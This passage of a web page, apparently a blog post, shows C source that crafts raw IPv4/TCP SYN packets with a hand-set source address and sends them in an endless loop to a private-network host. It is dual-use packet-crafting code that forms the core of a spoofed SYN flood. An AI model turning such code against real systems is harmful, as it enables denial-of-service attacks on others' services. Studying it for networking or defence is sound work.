t;errno.h&gt;</div><div class="line">#include &lt;netinet/tcp.h&gt;</div><div class="line">#include &lt;netinet/ip.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;netinet/in.h&gt;</div><div class="line">#include &lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">#pragma pack(1)</div><div class="line">struct pseudo_header    //needed for checksum calculation</div><div class="line">&#123;</div><div class="line">	unsigned int source_address;</div><div class="line">	unsigned int dest_address;</div><div class="line">	unsigned char placeholder;</div><div class="line">	unsigned char protocol;</div><div class="line">	unsigned short tcp_length;</div><div class="line"></div><div class="line">	struct tcphdr tcp;</div><div class="line">&#125;;</div><div class="line">#pragma pack()</div><div class="line"></div><div class="line">unsigned short csum(unsigned short *ptr, int nbytes) &#123;</div><div class="line"> long sum;</div><div class="line"> unsigned short oddbyte;</div><div class="line"> short answer;</div><div class="line"></div><div class="line"> sum = 0;</div><div class="line"> while (nbytes &gt; 1) &#123;</div><div class="line">   sum += *ptr++;</div><div class="line">   nbytes -= 2;</div><div class="line"> &#125;</div><div class="line"> if (nbytes == 1) &#123;</div><div class="line">   oddbyte = 0;</div><div class="line">   *((u_char*) &amp;oddbyte) = *(u_char*) ptr;</div><div class="line">   sum += oddbyte;</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);</div><div class="line"> sum = sum + (sum &gt;&gt; 16);</div><div class="line"> answer = (short) ~sum;</div><div class="line"></div><div class="line"> return (answer);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void oneSyn(int socketfd, in_addr_t source, u_int16_t sourcePort,</div><div class="line">		in_addr_t destination, u_int16_t destinationPort) &#123;</div><div class="line">	static char sendBuf[sizeof(iphdr) + sizeof(tcphdr)] = &#123; 0 &#125;;</div><div class="line">	bzero(sendBuf, sizeof(sendBuf));</div><div class="line"></div><div class="line">	struct iphdr* ipHeader = (iphdr*) sendBuf;</div><div class="line">	struct tcphdr *tcph = (tcphdr*) (sendBuf + sizeof(iphdr));</div><div class="line"></div><div class="line">	ipHeader-&gt;version = 4;</div><div class="line">	ipHeader-&gt;ihl = 5;</div><div class="line"></div><div class="line">	ipHeader-&gt;tos = 0;</div><div class="line">	ipHeader-&gt;tot_len = htons(sizeof(sendBuf));</div><div class="line"></div><div class="line">	ipHeader-&gt;id = htons(1);</div><div class="line">	ipHeader-&gt;frag_off = 0;</div><div class="line">	ipHeader-&gt;ttl = 254;</div><div class="line">	ipHeader-&gt;protocol = IPPROTO_TCP;</div><div class="line">	ipHeader-&gt;check = 0;</div><div class="line">	ipHeader-&gt;saddr = source;</div><div class="line">	ipHeader-&gt;daddr = destination;</div><div class="line"></div><div class="line">	ipHeader-&gt;check = csum((unsigned short*) ipHeader, ipHeader-&gt;ihl * 2);</div><div class="line"></div><div class="line">	//TCP Header</div><div class="line">	tcph-&gt;source = htons(sourcePort);</div><div class="line">	tcph-&gt;dest = htons(destinationPort);</div><div class="line">	tcph-&gt;seq = 0;</div><div class="line">	tcph-&gt;ack_seq = 0;</div><div class="line">	tcph-&gt;doff = 5; //sizeof(tcphdr)/4</div><div class="line">	tcph-&gt;fin = 0;</div><div class="line">	tcph-&gt;syn = 1;</div><div class="line">	tcph-&gt;rst = 0;</div><div class="line">	tcph-&gt;psh = 0;</div><div class="line">	tcph-&gt;ack = 0;</div><div class="line">	tcph-&gt;urg = 0;</div><div class="line">	tcph-&gt;window = htons(512);</div><div class="line">	tcph-&gt;check = 0;</div><div class="line">	tcph-&gt;urg_ptr = 0;</div><div class="line"></div><div class="line">	//tcp header checksum</div><div class="line">	struct pseudo_header pseudoHeader;</div><div class="line">	pseudoHeader.source_address = source;</div><div class="line">	pseudoHeader.dest_address = destination;</div><div class="line">	pseudoHeader.placeholder = 0;</div><div class="line">	pseudoHeader.protocol = IPPROTO_TCP;</div><div class="line">	pseudoHeader.tcp_length = htons(sizeof(tcphdr));</div><div class="line">	memcpy(&amp;pseudoHeader.tcp, tcph, sizeof(struct tcphdr));</div><div class="line"></div><div class="line">	tcph-&gt;check = csum((unsigned short*) &amp;pseudoHeader, sizeof(pseudo_header));</div><div class="line"></div><div class="line">	struct sockaddr_in sin;</div><div class="line">	sin.sin_family = AF_INET;</div><div class="line">	sin.sin_port = htons(sourcePort);</div><div class="line">	sin.sin_addr.s_addr = destination;</div><div class="line"></div><div class="line">	ssize_t sentLen = sendto(socketfd, sendBuf, sizeof(sendBuf), 0,</div><div class="line">			(struct sockaddr *) &amp;sin, sizeof(sin));</div><div class="line">	if (sentLen == -1) &#123;</div><div class="line">		perror(&quot;sent error&quot;);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(void) &#123;</div><div class="line">	//for setsockopt</div><div class="line">	int optval = 1;</div><div class="line"></div><div class="line">	//create a raw socket</div><div class="line">	int socketfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);</div><div class="line">	if (socketfd == -1) &#123;</div><div class="line">		perror(&quot;create socket:&quot;);</div><div class="line">		exit(0);</div><div class="line">	&#125;</div><div class="line">	if (setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &amp;optval, sizeof(optval))</div><div class="line">			&lt; 0) &#123;</div><div class="line">		perror(&quot;create socket:&quot;);</div><div class="line">		exit(0);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	in_addr_t source = inet_addr(&quot;192.168.1.100&quot;);</div><div class="line">	in_addr_t destination = inet_addr(&quot;192.168.1.101&quot;);</div><div class="line">	u_int16_t sourcePort = 1;</div><div class="line">	u_int16_t destinationPort = 9999;</div><div class="line">	while (1) &#123;</div><div class="line">		oneSyn(socketfd, source, sourcePort++, destination,</div><div class="line">				destinationPort);</div><div class="line">		sourcePort %= 65535;</div><div class="line">		sleep(1);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
